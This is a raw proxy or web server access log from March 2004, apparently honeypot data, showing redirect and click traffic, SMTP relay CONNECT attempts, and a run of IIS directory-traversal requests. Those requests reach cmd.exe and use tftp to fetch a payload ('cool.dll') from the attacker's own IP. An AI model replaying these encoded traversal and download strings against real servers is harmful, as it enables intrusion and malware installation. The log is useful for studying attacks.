IP	Ident	Userid	Timestamp	Timezone	HTTP_Request	HTTP_Status	HTTP_Duration	HTTP_Referer	Browser_Type
24.201.201.176	-	-	[09/Mar/2004:23:38:26	-0500]	GET http://3000search.com/redirect.php?fID=163480912 HTTP/1.1	302	5	http://3000search.com/search_results.php?fSearch_id=cb2a55a06b4b46d6&fString=miami+beach+hotel	Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)
24.201.201.176	-	-	[09/Mar/2004:23:38:27	-0500]	GET http://click.search123.com/cgi-bin/clickthru.cgi?EI=62793&Q=miami%20beach%20hotel&NGT=CV330kGVYHYwPOO4+Jc9eOfsNfajcy3xxMqrRoDsq6XneYinFCEPqAwd+OOfHjTODY2dOWLmD5x75g8W/In0+/E04NMHuEF0tjOWE0bz2m9DFG+4VwKJotFVlYTgvxMiIucfLR7lKt/ktpzgS8U3KVo0qq+nHpHvyU3uNPJ6oI328xZBN1eTQZQIsLIG5sxIfXjpRYk/L75cO1mHuWiHFUkT3Or0MZMLZS3thzhz4700kksW73c0E5dFOUJDZlQMizMym5qIJDexH2eb88jzh21Ss2c5kp3FNsX/sutQ/NL0CSiDTPlkQ0eV+IdosHkTy+gaEwpcwu09ymkSzn+TNJkLaIsMIraAN0bpOGoy0fo62iai+ueLbJWcnDTeC0ZcmzZuyRzyDk0NRkmvubcg3eHBoNjV5zEqV8Cldm5gbdhKZxCSsDRFcZ3dvhs0fX+C950w/jax+Rk=&x=1&UID=15862&IP=192.168.1.103 HTTP/1.1	302	525	http://3000search.com/search_results.php?fSearch_id=cb2a55a06b4b46d6&fString=miami+beach+hotel	Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)
24.201.201.176	-	-	[09/Mar/2004:23:38:28	-0500]	GET http://c.ah-ha.com/c?e1=eD1Oxv5QolLCgHokTmxDEKERyVaopdp2W0lRYtQxlE43VypL1pPVj5M4v2KCGhI5TQebOV4skUAQw4Qq4JZIeEEEcma3iQpKbdTizcXlCmlYq2KFjpz3i1RPwbRLHTrIWkMOjfpCSgrWcFqhsXtPAAjEhrSdRn0kiqmXX0PEPyf12uDFT4AJnuWeYm1OhdLzTwYzOI2WuWGAzfiYTDAPPud0cgpm33eZbmnaIkFeJdhnvnOwOjAHYponPl3bRh3nOJt5UXdQRmvLoFnZcJigXuqMAHEUe&h=pKKOOBMIZbBbImCH3&b=29269 HTTP/1.1	302	0	http://3000search.com/search_results.php?fSearch_id=cb2a55a06b4b46d6&fString=miami+beach+hotel	Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)
24.201.201.176	-	-	[09/Mar/2004:23:38:28	-0500]	GET http://c.ah-ha.com/c/2?e1=eD1Oxv5QolLCgHokTmxDEKERyVaopdp2W0lRYtQxlE43VypL1pPVj5M4v2KCGhI5TQebOV4skUAQw4Qq4JZIeEEEcma3iQpKbdTizcXlCmlYq2KFjpz3i1RPwbRLHTrIWkMOjfpCSgrWcFqhsXtPAAjEhrSdRn0kiqmXX0PEPyf12uDFT4AJnuWeYm1OhdLzTwYzOI2WuWGAzfiYTDAPPud0cgpm33eZbmnaIkFeJdhnvnOwOjAHYponPl3bRh3nOJt5UXdQRmvLoFnZcJigXuqMAHEUe&h=pKKOOBMIZbBbImCH3&b=29269 HTTP/1.1	302	0	http://3000search.com/search_results.php?fSearch_id=cb2a55a06b4b46d6&fString=miami+beach+hotel	Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)
192.117.242.67	-	-	[09/Mar/2004:23:38:56	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
68.48.142.117	-	-	[09/Mar/2004:23:39:13	-0500]	GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:40:03	-0500]	GET /_mem_bin/..%255c../..%255c../..%255c../httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:40:03	-0500]	GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:40:04	-0500]	GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:40:04	-0500]	GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:40:04	-0500]	GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:40:04	-0500]	GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:40:04	-0500]	GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:40:04	-0500]	GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:40:04	-0500]	GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:40:05	-0500]	GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:40:05	-0500]	GET /scripts/..%c1%1c../httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:40:05	-0500]	GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0	404	305	-	-
68.48.142.117	-	-	[09/Mar/2004:23:40:05	-0500]	GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:40:05	-0500]	GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:40:05	-0500]	GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:40:05	-0500]	GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:40:06	-0500]	GET /scripts/..%c0%af../httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:40:06	-0500]	GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:40:06	-0500]	GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:40:06	-0500]	GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:40:06	-0500]	GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:40:06	-0500]	GET /scripts/..%c1%9c../httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:40:07	-0500]	GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0	400	289	-	-
68.48.142.117	-	-	[09/Mar/2004:23:40:07	-0500]	GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0	400	289	-	-
68.48.142.117	-	-	[09/Mar/2004:23:41:00	-0500]	GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0	200	566	-	-
192.117.242.67	-	-	[09/Mar/2004:23:41:08	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
192.117.242.67	-	-	[09/Mar/2004:23:41:09	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
66.36.242.145	-	-	[09/Mar/2004:23:41:46	-0500]	GET http://www.stayinvisible.com/index.php?module=database&func=view&did=1&orderby=3&order=asc&page=6 HTTP/1.1	404	215	-	-
68.48.142.117	-	-	[09/Mar/2004:23:41:50	-0500]	GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0	200	566	-	-
66.36.242.145	-	-	[09/Mar/2004:23:42:10	-0500]	CONNECT irc.dal.net:6667 HTTP/1.0	500	434	-	-
68.48.142.117	-	-	[09/Mar/2004:23:42:40	-0500]	GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0	200	566	-	-
66.36.242.145	-	-	[09/Mar/2004:23:42:51	-0500]	GET http://surfsafe.cpc-net.org/modules.php?op=modload&name=Tools&file=proxies&offset=4 HTTP/1.1	500	538	-	-
68.48.142.117	-	-	[09/Mar/2004:23:43:31	-0500]	GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0	200	566	-	-
192.117.242.67	-	-	[09/Mar/2004:23:43:49	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
68.48.142.117	-	-	[09/Mar/2004:23:44:21	-0500]	GET /scripts/..%25%35%63../httpodbc.dll HTTP/1.0	200	566	-	-
203.121.182.189	-	-	[09/Mar/2004:23:44:26	-0500]	CONNECT 211.116.247.13:25 HTTP/1.0	200	-	-	-
68.48.142.117	-	-	[09/Mar/2004:23:45:11	-0500]	GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:46:01	-0500]	GET /scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0	200	566	-	-
61.172.244.216	-	-	[09/Mar/2004:23:46:09	-0500]	CONNECT 210.242.13.186:25 HTTP/1.0	200	-	-	-
192.117.242.67	-	-	[09/Mar/2004:23:46:09	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
192.117.242.67	-	-	[09/Mar/2004:23:46:10	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
68.48.142.117	-	-	[09/Mar/2004:23:46:51	-0500]	GET /scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0	200	566	-	-
24.235.131.196	-	-	[09/Mar/2004:23:47:03	-0500]	GET http://www.184u.com/iframe.php HTTP/1.0	301	0	http://www.184u.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
203.121.182.144	-	-	[09/Mar/2004:23:47:35	-0500]	CONNECT 209.15.20.82:25 HTTP/1.0	200	-	-	-
68.48.142.117	-	-	[09/Mar/2004:23:47:41	-0500]	GET /scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0	200	566	-	-
218.78.209.42	-	-	[09/Mar/2004:23:47:54	-0500]	CONNECT 209.15.20.48:25 HTTP/1.0	200	-	-	-
68.48.142.117	-	-	[09/Mar/2004:23:48:31	-0500]	GET /scripts/..%252f../httpodbc.dll HTTP/1.0	200	566	-	-
24.235.131.196	-	-	[09/Mar/2004:23:48:34	-0500]	GET http://www.1latinsex.com/iframe.php HTTP/1.0	500	416	http://www.1latinsex.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
213.112.232.43	-	-	[09/Mar/2004:23:48:49	-0500]	GET http://hpcgi1.nifty.com/trino/ProxyJ/prxjdg.cgi HTTP/1.0	200	2046	-	Mozilla/4.0
192.117.242.67	-	-	[09/Mar/2004:23:48:51	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
24.235.131.196	-	-	[09/Mar/2004:23:49:41	-0500]	GET http://www.acumbabe.com/iframe.php HTTP/1.0	404	6010	http://www.acumbabe.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
24.235.131.196	-	-	[09/Mar/2004:23:50:32	-0500]	GET http://www.adultcontentpics.com/iframe.php HTTP/1.0	500	430	http://www.adultcontentpics.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
24.235.131.196	-	-	[09/Mar/2004:23:50:51	-0500]	GET http://www.absex.org/iframe.php HTTP/1.0	500	408	http://www.absex.org/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
212.160.136.163	-	-	[09/Mar/2004:23:51:08	-0500]	GET http://www.blowsearch.com/r.php?mc=rresCCC3240512629GGGfreePPP2QQQ23PPP3290019082PPP80QQQ60QQQ328QQQ321BBB3240512629BBB3290016482PPP80QQQ60QQQ328QQQ321PPPblowsearch=xpwAAAxpw=QV?vtpsDDDe/upenrf/ynpbyOOOvtp/zbpDDDxpvhdOOOgvqavsDDDjjj//CCCcgguCCCCCCMMM112CCCCCC711DDD1CCCCCCrresCCCCCC2735099812OOO4941118308OOO012DDD712DDD95DDD97CCCCCC2798099812CCCCCC012DDD712DDD95DDD97CCCCCCajbeomCCCCCC]xpvhDgVqavS[CCCCCC4941118308&v=a5959243a4c81e8e9c87fc6e7e9b47ba HTTP/1.0	302	2	http://www.blowsearch.com/search.php?affiliate=zbrown&keywords=free	Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)
192.117.242.67	-	-	[09/Mar/2004:23:51:08	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
192.117.242.67	-	-	[09/Mar/2004:23:51:09	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
212.160.136.163	-	-	[09/Mar/2004:23:51:10	-0500]	GET http://www.findit-quick.com/cgi-local/search/r.fcgi?ID=jck&jck=upenrfjbyoCCC012DDD712DDD95DDD97CCC1735099812OOO8151049312OOO012DDD712DDD95DDD97CCC1798099812CCC21DDD1CCCrresTTT8151049312:free HTTP/1.0	302	315	http://www.blowsearch.com/search.php?affiliate=zbrown&keywords=free	Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)
212.160.136.163	-	-	[09/Mar/2004:23:51:11	-0500]	GET http://xray-eye.com/word.php?searchkeyword=free&ds=yes HTTP/1.0	302	8471	http://www.blowsearch.com/search.php?affiliate=zbrown&keywords=free	Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)
212.160.136.163	-	-	[09/Mar/2004:23:51:13	-0500]	GET http://xray-eye.com/redir.php?idk=15400480 HTTP/1.0	302	0	http://www.blowsearch.com/search.php?affiliate=zbrown&keywords=free	Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)
212.160.136.163	-	-	[09/Mar/2004:23:51:14	-0500]	GET http://c.ah-ha.com/c?e1=eD1Oxv5QolLEaEShzbexuODcut0KWfl3qvPRYtQxlE43r1x3oLlhosU1aVEIKPVjT2yjeCZc5vSzVDwkY2WHRloERa1MiM2FbxfTH4ba1zFXZ3HHjpz3i1RP3kKHGhzgSmXlqpMEmvfvJqkLPClEqHZhfLmJNZxkCB3pfnrXylv45LKdkCdvkcCvYvFaeM1bJH3JobVzVNwXUj0TZam1PuKcFKumFFUvoQCFI5kSJdfTMpCPT&h=eaxhmJYvMFoqWxDBT&b=65154 HTTP/1.0	302	0	http://www.blowsearch.com/search.php?affiliate=zbrown&keywords=free	Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)
24.235.131.196	-	-	[09/Mar/2004:23:51:14	-0500]	GET http://www.adultswinging.com/iframe.php HTTP/1.0	302	0	http://www.adultswinging.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
212.160.136.163	-	-	[09/Mar/2004:23:51:15	-0500]	GET http://c.ah-ha.com/c/2?e1=eD1Oxv5QolLEaEShzbexuODcut0KWfl3qvPRYtQxlE43r1x3oLlhosU1aVEIKPVjT2yjeCZc5vSzVDwkY2WHRloERa1MiM2FbxfTH4ba1zFXZ3HHjpz3i1RP3kKHGhzgSmXlqpMEmvfvJqkLPClEqHZhfLmJNZxkCB3pfnrXylv45LKdkCdvkcCvYvFaeM1bJH3JobVzVNwXUj0TZam1PuKcFKumFFUvoQCFI5kSJdfTMpCPT&h=eaxhmJYvMFoqWxDBT&b=65154 HTTP/1.0	302	0	http://www.blowsearch.com/search.php?affiliate=zbrown&keywords=free	Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)
212.160.136.163	-	-	[09/Mar/2004:23:51:19	-0500]	GET http://www.kazaa-gold.com/ HTTP/1.0	200	16435	http://www.blowsearch.com/search.php?affiliate=zbrown&keywords=free	Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)
61.53.76.40	-	-	[09/Mar/2004:23:51:32	-0500]	POST http://69.59.175.60/found-best.com/search.php HTTP/1.0	200	20175	http://www.annies-biz.com/pages/ptc.php	Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)
218.29.56.234	-	-	[09/Mar/2004:23:51:46	-0500]	GET http://www.searchwallet.com/cgi-bin/sf.cgi?t=n0&keys=fmhihzaa5b4smsicozcfmdpfafksvsocvcnachidcfzdzzhxdhnakhospddsmsixdczazdmdfaadxffcsxkaohofiasamzscochapfhakfzapzhahzcsmhofsddsmsixdzczifadfassvzihohvachospsyhsszzcciasfsasdmsydohacmacfoddsysazzxczcscaifadfavfchocnacdkaidyhxshxcxdznhnspfzskfdcscmamdkdxfzazdscsxsznfzdfdiahzzcaxdzidfaafzahdzahcnzkhndxddssdzzcxkaxhndxskapdncacmszaoaadfsndocsczzvdpfadyhadacoxsshfadfdihxzhzmchzydkdfdyszdahocnzoanfafxsyfxcscmasfzfadfacdscocpszaahzasavdahsxdzhfisxfvsnzhzphvahfxsxfvhcszahzcaphadfddsmsihoczzhdfsxfvhdzixdzcayfxfoddhpdmzcxkacfcsmdyhpfdhoxkaahadfskhpadahcpznfxhhskaczszmzxsmaadfaaazzicazcahfvaifxhdzixdzcayfxfoddsmshazhnzyhaspfxhhdmxfhnziaofifkhdzixdzcayfxfodddzfyazzcacaaffdisnfxzpxdfmdpdxfzskffazcfacaafffkhcdmcsxdazfzdxfzsnzaxxcmzihidcdihasocvcmzidkdxdyhcsaxccmzyfcfafzzkschhhvsyaphxzpsozoznakzphaazzxafzhznayadhkhyzphxamazzcadhnhfzysoznzhzkakaizsansaacaphnavspsiafaasosaznaksvasszzkziacanzyhhaxsnshzpzzhiayzchzhahmzxsvapznhpznzohszzsvayzohpzvhahvaczszksvhhayamsmhdzczmaoakaizddffdsaaizohnznzkhkszhazc&kw=pos HTTP/1.1	302	269	http://www.searchwallet.com/cgi-bin/smartsearch.cgi?username=minon&keywords=POS	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
80.54.146.135	-	-	[09/Mar/2004:23:51:52	-0500]	GET http://mine-seek.com/search.php?ID=2&fString=buy+meridia HTTP/1.0	302	0	http://www.just-seek.com/julias/	Mozilla/4.0 (compatible; MSIE 5.5; Windows ME)
80.54.146.135	-	-	[09/Mar/2004:23:52:03	-0500]	GET http://mine-seek.com/search_results.php?fSearch_id=ae85838372a83f6f&fString=buy+meridia HTTP/1.0	200	15720	http://www.just-seek.com/julias/	Mozilla/4.0 (compatible; MSIE 5.5; Windows ME)
80.54.146.135	-	-	[09/Mar/2004:23:52:04	-0500]	GET http://mine-seek.com/redirect.php?fID=2830167 HTTP/1.0	302	0	http://mine-seek.com/search_results.php?fSearch_id=ae85838372a83f6f&fString=buy+meridia	Mozilla/4.0 (compatible; MSIE 5.5; Windows ME)
24.235.131.196	-	-	[09/Mar/2004:23:52:54	-0500]	GET http://www.allteensex.org/iframe.php HTTP/1.0	302	205	http://www.allteensex.org/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
24.235.131.196	-	-	[09/Mar/2004:23:53:13	-0500]	GET http://www.alternate-earth.com/iframe.php HTTP/1.0	404	1382	http://www.alternate-earth.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
24.235.131.196	-	-	[09/Mar/2004:23:53:17	-0500]	GET http://www.allteens.com/iframe.php HTTP/1.0	302	0	http://www.allteens.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
192.117.242.67	-	-	[09/Mar/2004:23:53:54	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
24.235.131.196	-	-	[09/Mar/2004:23:55:27	-0500]	GET http://www.americansexe.com/iframe.php HTTP/1.0	500	422	http://www.americansexe.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
24.235.131.196	-	-	[09/Mar/2004:23:56:00	-0500]	GET http://www.analassault.com/iframe.php HTTP/1.0	302	0	http://www.analassault.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
192.117.242.67	-	-	[09/Mar/2004:23:56:07	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
192.117.242.67	-	-	[09/Mar/2004:23:56:07	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
202.205.89.188	-	-	[09/Mar/2004:23:56:11	-0500]	GET http://www.enjoysearching.com/cgi-bin/sf.cgi?t=sd&keys=shaohiaizihahiamzcafaohizchkszzhaxsysdsnhfsvanzyaksazshmaosoassksdzfzcavskzyaaavzosxzzhfsfaiazhfahafsosvhoaozchksihhdsfohhaaavhmzchazcsfhazx&kw=jobs&keys2=zkhnhzzohszzapzchpfmahdsdvdoaxzzdndpffszfizshacpdffzhmsmzhzccccysisofndaacddzhzcdddmfxfxdvzaxzcpdmfsaxzyacapcihsaafhsoadshaycfzasksfdadaffzxcozcfhfddzsyfzzahazndcdoayadfhaxcpcpdmsfaaayassoahzhfnavhffnsmzahhczfyfdfsdfdczxxdhaapsdakdvssfohfxofhaishdfhdfcxzaiamaosvdcsyfazcchdffcssfvsvsxhhzhdcsvdiscafdmaxcxsifxsidxfydfcfcczisvfxfkfffchkxmamsvdisxdcfsxfcmadsidaahhsdyzscasvfdszahavdszicfdoaaskszhxfahhaosvfpshdzamakcnaofzszsodhfhascdapzndpayahfxafcmcishhnfizissszzzzodydksnfcshaxaczpskhnacfyaffszhhvfhaaszdphcaizicmzodvazzdhfsxanhvhdafszskzoamhfszsvscznskzihpaozpamsyadzdapaszysyadayshafskznxcxyhphnhzzkzozhaphnspsx&kw=jobs HTTP/1.0	302	941	http://www.enjoysearching.com/cgi-bin/smartsearch.cgi?username=tina&keywords=jobs	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
202.205.89.188	-	-	[09/Mar/2004:23:56:21	-0500]	GET http://www.searchdrifter.com/cgi-bin/sf.cgi?t=ha&keys=zkhnhzzohszzapzchpfmahdsdvdoaxzzdndpffszfizshacpdffzhmsmzhzccccysisofndaacddzhzcdddmfxfxdvzaxzcpdmfsaxzyacapcihsaafhsoadshaycfzasksfdadaffzxcozcfhfddzsyfzzahazndcdoayadfhaxcpcpdmsfaaayassoahzhfnavhffnsmzahhczfyfdfsdfdczxxdhaapsdakdvssfohfxofhaishdfhdfcxzaiamaosvdcsyfazcchdffcssfvsvsxhhzhdcsvdiscafdmaxcxsifxsidxfydfcfcczisvfxfkfffchkxmamsvdisxdcfsxfcmadsidaahhsdyzscasvfdszahavdszicfdoaaskszhxfahhaosvfpshdzamakcnaofzszsodhfhascdapzndpayahfxafcmcishhnfizissszzzzodydksnfcshaxaczpskhnacfyaffszhhvfhaaszdphcaizicmzodvazzdhfsxanhvhdafszskzoamhfszsvscznskzihpaozpamsyadzdapaszysyadayshafskznxcxyhphnhzzkzozhaphnspsx&kw=jobs HTTP/1.0	302	549	http://www.enjoysearching.com/cgi-bin/smartsearch.cgi?username=tina&keywords=jobs	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
202.205.89.188	-	-	[09/Mar/2004:23:56:22	-0500]	GET http://c.ah-ha.com/c?e1=eD1Oxv5QolLcoHdDc0ep1osKaIPqpdp2W0lRYtQxlE43QrSXxyK4BxkWpOh4eG4mulNXxRmxoXhUtW3xJqbOHHHlMntElFNCNn0BRTYVwBcA0AdkMnWyeewJsAAYnGyUbht5FF0YpgLGhKpTkxskG2HYSXFZe4uI4dGy2kfnjwTPZoSzlHWni4TdEXLbW2NBJweuRwszxZzlXbh1dUTPF4MLNFBboShBArcSN3&h=YAPi5BmQEQz0UMAfP&b=133202 HTTP/1.0	302	0	http://www.enjoysearching.com/cgi-bin/smartsearch.cgi?username=tina&keywords=jobs	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
202.205.89.188	-	-	[09/Mar/2004:23:56:23	-0500]	GET http://c.ah-ha.com/c/2?e1=eD1Oxv5QolLcoHdDc0ep1osKaIPqpdp2W0lRYtQxlE43QrSXxyK4BxkWpOh4eG4mulNXxRmxoXhUtW3xJqbOHHHlMntElFNCNn0BRTYVwBcA0AdkMnWyeewJsAAYnGyUbht5FF0YpgLGhKpTkxskG2HYSXFZe4uI4dGy2kfnjwTPZoSzlHWni4TdEXLbW2NBJweuRwszxZzlXbh1dUTPF4MLNFBboShBArcSN3&h=YAPi5BmQEQz0UMAfP&b=133202 HTTP/1.0	302	0	http://www.enjoysearching.com/cgi-bin/smartsearch.cgi?username=tina&keywords=jobs	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
24.235.131.196	-	-	[09/Mar/2004:23:56:50	-0500]	GET http://www.am-ass.com/iframe.php HTTP/1.0	502	529	http://www.am-ass.com/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
24.235.131.196	-	-	[09/Mar/2004:23:57:46	-0500]	GET http://www.art-nudes.de/iframe.php HTTP/1.0	404	2118	http://www.art-nudes.de/iframe.php	Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
61.172.244.216	-	-	[09/Mar/2004:23:58:12	-0500]	CONNECT 207.137.186.108:25 HTTP/1.0	200	-	-	-
192.117.242.67	-	-	[09/Mar/2004:23:58:53	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
